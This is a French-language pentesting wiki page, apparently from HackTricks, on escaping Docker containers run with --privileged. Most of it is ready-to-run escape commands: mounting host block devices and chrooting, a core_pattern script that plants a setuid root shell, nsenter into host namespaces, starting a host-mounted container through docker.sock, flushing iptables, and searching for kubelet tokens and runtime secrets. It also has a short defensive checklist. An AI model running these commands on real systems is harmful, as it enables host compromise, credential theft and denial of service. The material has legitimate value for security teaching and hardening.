# Sortir de conteneurs `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble

Un conteneur démarré avec `--privileged` n’est pas simplement un conteneur normal doté d’une ou deux permissions supplémentaires. En pratique, `--privileged` supprime ou affaiblit plusieurs protections par défaut du runtime qui empêchent normalement le workload d’accéder aux ressources dangereuses de l’hôte. L’effet exact dépend toujours du runtime et de l’hôte, mais avec Docker, le résultat habituel est le suivant :

- toutes les capabilities sont accordées
- les restrictions du device cgroup sont supprimées
- de nombreux systèmes de fichiers du kernel cessent d’être montés en lecture seule
- les chemins procfs masqués par défaut disparaissent
- le filtrage seccomp est désactivé
- le confinement AppArmor est désactivé
- l’isolation SELinux est désactivée ou remplacée par un label beaucoup plus permissif

La conséquence importante est qu’un conteneur privilégié n’a généralement **pas** besoin d’un kernel exploit subtil. Dans de nombreux cas, il peut simplement interagir directement avec les devices de l’hôte, les systèmes de fichiers du kernel exposés à l’hôte ou les interfaces du runtime, puis pivoter vers un shell sur l’hôte.

## Ce Que `--privileged` Ne Modifie Pas Automatiquement

`--privileged` ne rejoint **pas** automatiquement les namespaces PID, réseau, IPC ou UTS de l’hôte. Un conteneur privilégié peut toujours disposer de namespaces privés. Cela signifie que certaines chaînes d’escape nécessitent une condition supplémentaire, telle que :

- un bind mount de l’hôte
- le partage du PID de l’hôte
- le réseau de l’hôte
- des devices de l’hôte visibles
- des interfaces proc/sys accessibles en écriture

Ces conditions sont souvent faciles à satisfaire dans les mauvaises configurations réelles, mais elles sont conceptuellement distinctes de `--privileged` lui-même.

## Paths d’escape

### 1. Monter le disque de l’hôte via les devices exposés

Un conteneur privilégié voit généralement beaucoup plus de nœuds de devices sous `/dev`. Si le block device de l’hôte est visible, l’escape le plus simple consiste à le monter, puis à utiliser `chroot` pour entrer dans le filesystem de l’hôte :
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Si la partition racine n’est pas évidente, énumérez d’abord la disposition des blocs :
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Si l’approche pratique consiste à placer un helper setuid dans un montage hôte accessible en écriture plutôt qu’à utiliser `chroot`, rappelez-vous que tous les systèmes de fichiers ne respectent pas le bit setuid. Une vérification rapide des capacités côté hôte est la suivante :
```bash
mount | grep -v "nosuid"
```
C'est utile, car les chemins accessibles en écriture sur les filesystems `nosuid` sont beaucoup moins intéressants pour les workflows classiques consistant à « déposer un shell setuid et l'exécuter ultérieurement ».

Les protections affaiblies exploitées ici sont les suivantes :

- exposition complète des devices
- capabilities étendues, notamment `CAP_SYS_ADMIN`

Pages associées :

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Monter ou réutiliser un bind mount de l'hôte et utiliser `chroot`

Si le filesystem root de l'hôte est déjà monté dans le container, ou si le container peut créer les mounts nécessaires parce qu'il est privileged, un shell de l'hôte n'est souvent qu'à un `chroot` de distance :
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si aucun bind mount de la racine de l’hôte n’existe mais que le stockage de l’hôte est accessible, créez-en un :
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Ce chemin exploite :

- des restrictions de montage affaiblies
- des capabilities complètes
- l’absence de confinement MAC

Pages associées :

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Exploiter un `/proc/sys` ou `/sys` accessible en écriture

L’une des principales conséquences de `--privileged` est que les protections de procfs et sysfs deviennent beaucoup plus faibles. Cela peut exposer des interfaces du kernel accessibles depuis l’hôte, qui sont normalement masquées ou montées en lecture seule.

Un exemple classique est `core_pattern` :
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
D’autres chemins à forte valeur incluent :
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ce chemin exploite :

- des chemins masqués manquants
- des chemins système en lecture seule manquants

Pages associées :

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Utiliser toutes les capabilities pour une évasion basée sur Mount ou Namespace

Un conteneur privilégié obtient les capabilities qui sont normalement supprimées des conteneurs standard, notamment `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` et bien d'autres. Cela suffit souvent à transformer un point d'appui local en évasion vers l'hôte dès qu'une autre surface exposée existe.

Un exemple simple consiste à monter des systèmes de fichiers supplémentaires et à utiliser l'entrée dans un namespace :
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Si le PID de l’hôte est également partagé, l’étape devient encore plus courte :
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Cette voie exploite :

- l’ensemble de capabilities privilégiées par défaut
- le partage facultatif du PID de l’hôte

Pages associées :

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

Un conteneur privilégié finit souvent par exposer l’état ou les sockets du runtime de l’hôte. Si un socket Docker, containerd ou CRI-O est accessible, l’approche la plus simple consiste souvent à utiliser l’API du runtime pour lancer un second conteneur avec un accès à l’hôte :
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Pour containerd :
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Ce chemin exploite :

- l’exposition d’un runtime privileged
- les bind mounts vers l’hôte créés directement via le runtime

Pages associées :

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Supprimer les effets secondaires de l’isolation réseau

`--privileged` ne rejoint pas à lui seul le namespace réseau de l’hôte, mais si le conteneur utilise également `--network=host` ou un autre accès au réseau de l’hôte, l’ensemble de la stack réseau devient modifiable :
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Ce n’est pas toujours un shell direct sur l’hôte, mais cela peut entraîner un déni de service, l’interception du trafic ou l’accès à des services de gestion accessibles uniquement via loopback.

Pages associées :

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Lire les secrets de l’hôte et l’état du runtime

Même lorsqu’un shell escape propre n’est pas immédiat, les conteneurs privilégiés disposent souvent d’un accès suffisant pour lire les secrets de l’hôte, l’état de kubelet, les métadonnées du runtime et les systèmes de fichiers des conteneurs voisins :
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Si `/var` est monté depuis l’hôte ou si les répertoires du runtime sont visibles, cela peut suffire à permettre un mouvement latéral ou le vol d’identifiants cloud/Kubernetes, même avant l’obtention d’un shell sur l’hôte.

Pages associées :

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Vérifications

Le but des commandes suivantes est de confirmer quelles familles d’évasion de conteneur privilégié sont immédiatement exploitables.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Ce qui est intéressant ici :

- un ensemble complet de capabilities, en particulier `CAP_SYS_ADMIN`
- une exposition de proc/sys avec droits d'écriture
- des devices de l'hôte visibles
- l'absence de seccomp et de confinement MAC
- des runtime sockets ou des bind mounts de la racine de l'hôte avec droits d'écriture

Un seul de ces éléments peut suffire pour la post-exploitation. Plusieurs réunis signifient généralement que le container n'est qu'à une ou deux commandes d'une compromission de l'hôte.

## Pages connexes

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
